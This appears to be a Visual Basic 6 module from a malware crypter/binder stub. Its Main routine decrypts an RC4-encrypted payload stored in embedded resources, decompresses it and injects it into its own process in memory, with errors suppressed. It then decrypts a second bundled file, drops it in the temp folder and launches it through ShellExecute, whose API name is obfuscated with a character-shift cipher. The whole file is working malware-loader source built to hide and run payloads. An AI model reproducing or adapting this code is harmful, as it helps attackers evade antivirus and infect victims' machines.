Attribute VB_Name = "Module5"
Public Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

Public Function TempPath() As String
Dim strTemp As String
strTemp = String(256, Chr$(0))
GetTempPath 256, strTemp
TempPath = Left(strTemp, InStr(1, strTemp, Chr(0)) - 1)
End Function

'Makes it simpler to add a slash?
'----------------------------------------------------------------------------------
Public Function AddSlash(S As String) As String
AddSlash = S & IIf(Right(S, 1) = "\", "", "\")
End Function
'----------------------------------------------------------------------------------

Public Sub Main()
On Error Resume Next
Dim sBytes() As Byte, Matador As String
Matador = GetResDataBytes(1000, 1008)
sBytes = GetResDataBytes(1000, 1009)

RC4ED sBytes, Matador

If CLng(GetResData(1000, 1010)) - 1 <> UBound(sBytes) Then sBytes = DecompressData(sBytes, CLng(GetResData(1000, 1010)))

Dim i1 As Long
For i1 = 1 To 1000
If Inject(GetModuleName, sBytes) <> 0 Then Exit For
Next

Dim sAnadido As String
sAnadido = GetResData(1000, 8887)
If Len(sAnadido) > 0 Then
sBytes = GetResDataBytes(1000, 8888)
RC4ED sBytes, Matador
vbWriteByteFile AddSlash(TempPath) & sAnadido, sBytes

Call CallAPIByName("shell32", ROT13("`uryyRÖrpÇÅrN", True), 0, "", AddSlash(TempPath) & sAnadido, "", AddSlash(TempPath), 5)
End If
End Sub

Public Function vbWriteByteFile(ByVal sFileName As String, lpByte() As Byte) As Boolean
Dim fhFile As Integer
fhFile = FreeFile
Open sFileName For Binary As #fhFile
Put #fhFile, , lpByte()
Close #fhFile
End Function

Public Function ROT13(ByVal sData As String, Optional ByVal Decrypt As Boolean = False) As String
Dim i As Long

For i = 1 To Len(sData)
ROT13 = ROT13 & Chr$(Asc(Mid$(sData, i, 1)) + IIf((Decrypt = True), -13, 13))
Next i
End Function

Public Function STRING_TO_BYTES(sString As String) As Byte()
STRING_TO_BYTES = StrConv(sString, vbFromUnicode)
End Function

Public Function BYTES_TO_STRING(bBytes() As Byte) As String
BYTES_TO_STRING = bBytes
BYTES_TO_STRING = StrConv(BYTES_TO_STRING, vbUnicode)
End Function

